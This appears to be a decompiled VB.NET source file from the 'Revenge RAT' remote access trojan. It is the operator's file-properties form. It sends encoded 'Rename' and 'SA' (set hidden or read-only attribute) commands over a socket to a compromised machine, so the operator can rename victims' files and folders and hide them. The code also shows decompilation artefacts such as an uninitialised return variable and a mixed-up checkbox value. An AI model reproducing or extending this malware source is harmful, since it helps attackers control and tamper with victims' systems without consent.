Imports Microsoft.VisualBasic.CompilerServices
Imports System.Runtime.CompilerServices
Imports Revenge_RAT_v0._3.RevengeRAT

Public Class File_Properties
    Public FNS As String
    Public FP As String
    Public HIF As Boolean
    Public IT As Boolean
    Public REN As Boolean
    Public Sock As Integer
    Private Sub ApplySettings_Click(sender As Object, e As EventArgs) Handles ApplySettings.Click
        Me.SIN()
    End Sub

    Private Sub Cancel_Click(sender As Object, e As EventArgs) Handles Cancel.Click
        Me.Close()
    End Sub

    Private Sub File_Properties_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.ApplySettings.Enabled = False
    End Sub

    Private Sub FN_TextChanged(sender As Object, e As EventArgs) Handles FN.TextChanged
        Me.CEK()
    End Sub

    Private Sub HI_TextChanged(sender As Object, e As EventArgs) Handles HI.TextChanged
        Me.CEK()
    End Sub

    Private Sub OK_Click(sender As Object, e As EventArgs) Handles OK.Click
        Me.SIN()
        Me.Close()
    End Sub

    Private Sub RN_CheckedChanged(sender As Object, e As EventArgs) Handles RN.CheckedChanged
        Me.CEK()
    End Sub

    Public Function CEK() As Object
        Dim obj2 As Object
        If (Me.FNS = Me.FN.Text) Then
            Me.ApplySettings.Enabled = False
        Else
            Me.ApplySettings.Enabled = True
            Return obj2
        End If
        If (Me.REN = Me.RN.Checked) Then
            Me.ApplySettings.Enabled = False
        Else
            Me.ApplySettings.Enabled = True
            Return obj2
        End If
        If (Me.HIF = Me.HI.Checked) Then
            Me.ApplySettings.Enabled = False
            Return obj2
        End If
        Me.ApplySettings.Enabled = True
        Return obj2
    End Function
    Public Function SIN() As Object
        Dim obj2 As Object
        Dim objArray As Object()
        Dim flagArray As Boolean()
        If (Me.FNS <> Me.FN.Text) Then
            If Not Me.IT Then
                Dim arguments As Object() = New Object() {Me.Sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((("Rename" & My.Forms.Main.Key) & "Folder" & My.Forms.Main.Key), SocketServer.Encode(Me.Label8.Text)), My.Forms.Main.Key), SocketServer.Encode(Me.FN.Text))}
                flagArray = New Boolean() {True, False}
                NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, flagArray, True)
                If flagArray(0) Then
                    Me.Sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
                End If
            Else
                objArray = New Object() {Me.Sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((("Rename" & My.Forms.Main.Key) & "File" & My.Forms.Main.Key), SocketServer.Encode(Me.Label8.Text)), My.Forms.Main.Key), SocketServer.Encode(Me.FN.Text))}
                flagArray = New Boolean() {True, False}
                NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", objArray, Nothing, Nothing, flagArray, True)
                If flagArray(0) Then
                    Me.Sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(Integer)))
                End If
            End If
        End If
        If (Me.REN <> Me.RN.Checked) Then
            If Not Me.IT Then
                objArray = New Object() {Me.Sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((("SA" & My.Forms.Main.Key) & "Folder" & My.Forms.Main.Key), SocketServer.Encode(Me.Label8.Text)), My.Forms.Main.Key), Me.HI.Checked)}
                flagArray = New Boolean() {True, False}
                NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", objArray, Nothing, Nothing, flagArray, True)
                If flagArray(0) Then
                    Me.Sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(Integer)))
                End If
            Else
                objArray = New Object() {Me.Sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((("SA" & My.Forms.Main.Key) & "File" & My.Forms.Main.Key), SocketServer.Encode(Me.Label8.Text)), My.Forms.Main.Key), Me.HI.Checked), My.Forms.Main.Key), Me.RN.Checked)}
                flagArray = New Boolean() {True, False}
                NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", objArray, Nothing, Nothing, flagArray, True)
                If flagArray(0) Then
                    Me.Sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(Integer)))
                End If
            End If
        End If
        If (Me.HIF <> Me.HI.Checked) Then
            If Not Me.IT Then
                objArray = New Object() {Me.Sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((("SA" & My.Forms.Main.Key) & "Folder" & My.Forms.Main.Key), SocketServer.Encode(Me.Label8.Text)), My.Forms.Main.Key), Me.HI.Checked)}
                flagArray = New Boolean() {True, False}
                NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", objArray, Nothing, Nothing, flagArray, True)
                If flagArray(0) Then
                    Me.Sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(Integer)))
                End If
            Else
                objArray = New Object() {Me.Sock, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((("SA" & My.Forms.Main.Key) & "File" & My.Forms.Main.Key), SocketServer.Encode(Me.Label8.Text)), My.Forms.Main.Key), Me.HI.Checked), My.Forms.Main.Key), Me.RN.Checked)}
                flagArray = New Boolean() {True, False}
                NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", objArray, Nothing, Nothing, flagArray, True)
                If flagArray(0) Then
                    Me.Sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(Integer)))
                End If
            End If
        End If
        Me.HIF = Me.HI.Checked
        Me.REN = Me.RN.Checked
        Me.FNS = Me.FN.Text
        Me.ApplySettings.Enabled = False
        Return obj2
    End Function

End Class